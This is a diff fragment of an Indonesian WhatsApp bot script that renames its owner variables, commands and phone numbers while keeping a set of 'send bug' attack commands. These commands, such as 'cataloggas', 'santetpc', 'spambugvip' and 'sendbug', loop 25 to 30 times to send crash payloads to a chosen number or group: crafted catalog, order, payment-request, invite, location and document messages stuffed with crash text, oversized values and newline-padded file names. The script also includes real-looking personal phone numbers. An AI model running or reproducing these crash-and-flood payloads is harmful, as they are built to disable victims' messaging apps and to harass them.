 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'cataloggas': {
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: BayMax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productMessage": {
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `BayMax  WhatsApp ${virus} ${virtex(prefix)}`,
+"title": `baymax Bot WhatsApp ${virus} ${virtex(prefix)}`,
 "description": `${virus}${virtex(prefix)}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -2786,28 +2786,28 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6281390368580`
+"url": `https://wa.me/6287705048235`
 },
-"businessOwnerJid": "6281390368580@s.whatsapp.net",
+"businessOwnerJid": "6287705048235@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
-BayMax.relayMessage(num, catalog.message, { messageId: catalog.key.id })
+baymax.relayMessage(num, catalog.message, { messageId: catalog.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxlog':{
-if (!itsByMax) return reply(mess.owner)
+case 'kaylog':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: BayMax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `BayMax  WhatsApp ${virus} ${virtex(prefix)}`,
+"title": `baymax Bot WhatsApp ${virus} ${virtex(prefix)}`,
 "description": `${virus}${virtex(prefix)}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -2815,76 +2815,76 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6281390368580`
+"url": `https://wa.me/6287705048235`
 },
-"businessOwnerJid": "6281390368580@s.whatsapp.net",
+"businessOwnerJid": "6287705048235@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
-BayMax.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+baymax.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxloc':{
-if (!itsByMax) return reply(mess.owner)
+case 'kayloc':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: BayMax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"name": `BayMax  ${virus}${virtex(prefix)}`,
+"name": `baymax Bot ${virus}${virtex(prefix)}`,
 "url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": `BayMax  ${virus}${virtex(prefix)}`,
+"caption": `baymax Bot ${virus}${virtex(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 "mtype": "locationMessage"
 }
 }), { userJid: m.chat, quoted: lep })
-BayMax.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
+baymax.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxkontak':{
-if (!itsByMax) return reply(mess.owner)
+case 'kaykontak':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendContact(m.chat, owner, lep)
+baymax.sendContact(m.chat, owner, lep)
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxitem':{
-if (!itsByMax) return reply(mess.owner)
+case 'kayitem':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(m.chat, `BayMax  ${virus}${virtex(prefix)}`, `BayMax  ${virus}${virtex(prefix)}`, `BayMax  ${virus}${virtex(prefix)}`, ppnyauser, "6281390368580@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(m.chat, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxstick':{
-if (!itsByMax) return reply(mess.owner)
+case 'kaystick':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
+baymax.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxdoc':{
-if (!itsByMax) return reply(mess.owner)
+case 'kaydoc':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(m.chat, { 
+baymax.sendMessage(m.chat, { 
 document: ppnyauser, 
-fileName: `? BayMax  ??\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.???? ???`, 
+fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyauser, 
 fileLength: "999999999", 
@@ -2894,25 +2894,25 @@ await sleep(1000)
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxvn':{
-if (!itsByMax) return reply(mess.owner)
+case 'kayvn':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+baymax.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-case 'baymaxteks':{
-if (!itsByMax) return reply(mess.owner)
+case 'kayteks':{
+if (!itsMeKayla) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.relayMessage(m.chat, {
+baymax.relayMessage(m.chat, {
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `BayMax  ${virus}${virtex(prefix)}`, 
+text: `baymax Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2924,24 +2924,24 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'santedparah': 
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Contoh ${command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
-let hdhe = await BayMax.onWhatsApp(nmn)
+let hdhe = await baymax.onWhatsApp(nmn)
 if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 santed(bygbt, nmn, sender)
 break
 case 'santetpc':
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Contoh ${command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Contoh ${command} 6281297970769`)
 tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
-let kgdhwus = await BayMax.onWhatsApp(tosend)
+let kgdhwus = await baymax.onWhatsApp(tosend)
 if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 jumlah = '30'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(tosend, {
+baymax.sendMessage(tosend, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -2956,14 +2956,14 @@ await sleep(1000)
 reply(`Sukses`)
 break
 case 'santetgc':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let resultny = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '30'
 for (let i = 0; i < jumlah; i++) {
-let tosendgc = await BayMax.groupAcceptInvite(resultny)
-BayMax.sendMessage(tosendgc, {
+let tosendgc = await baymax.groupAcceptInvite(resultny)
+baymax.sendMessage(tosendgc, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -2978,50 +2978,50 @@ await sleep(1000)
 reply(`Sukses`)
 break
 case 'spambugvip':{
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
 numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
-let cekno = await BayMax.onWhatsApp(numt)
+let cekno = await baymax.onWhatsApp(numt)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (isNaN(jumlah)) return reply(`Harus berupa angka`)
-var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281390368580@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `???????-BayMax ????_���� ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `???????-BayMax ????_���� ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
-var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK ?',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR ' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: BayMax.waUploadToServer })
-var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `???????-BayMax ????_���� ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `???????-BayMax ????_���� ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
+var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6287705048235@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
+var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
+var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
 var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
-var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `???????-BayMax ????_���� ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
-var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `???????-BayMax ????_���� ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
+var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
+var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
 var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
-var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `???????-BayMax ????_���� ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
+var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
 for (let i = 0; i < jumlah; i++) {
-BayMax.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
-BayMax.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
-BayMax.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
-BayMax.relayMessage(numt, order.message, { messageId: order.key.id })
-BayMax.relayMessage(numt, audio.message, { messageId: audio.key.id })
-BayMax.relayMessage(numt, image.message, { messageId: image.key.id })
-BayMax.relayMessage(numt, document.message, { messageId: document.key.id })
-BayMax.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
-BayMax.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
-BayMax.sendKatalog(numt, `???????-BayMax ????_���� ${ngazap(prefix)}`, `???????-BayMax ????_���� ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
-BayMax.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
+baymax.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
+baymax.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+baymax.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
+baymax.relayMessage(numt, order.message, { messageId: order.key.id })
+baymax.relayMessage(numt, audio.message, { messageId: audio.key.id })
+baymax.relayMessage(numt, image.message, { messageId: image.key.id })
+baymax.relayMessage(numt, document.message, { messageId: document.key.id })
+baymax.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
+baymax.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
+baymax.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
+baymax.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
 }
 }
 break
 case 'sendbug':{
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-let kir = await BayMax.groupAcceptInvite(result)
-BayMax.relayMessage(kir, {
+let kir = await baymax.groupAcceptInvite(result)
+baymax.relayMessage(kir, {
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `BayMax  ${virus}${virtex(prefix)}`, 
+text: `baymax Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -3033,16 +3033,16 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'senddoc':{
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-let kir = await BayMax.groupAcceptInvite(result)
-BayMax.sendMessage(kir, { 
+let kir = await baymax.groupAcceptInvite(result)
+baymax.sendMessage(kir, { 
 document: ppnyauser, 
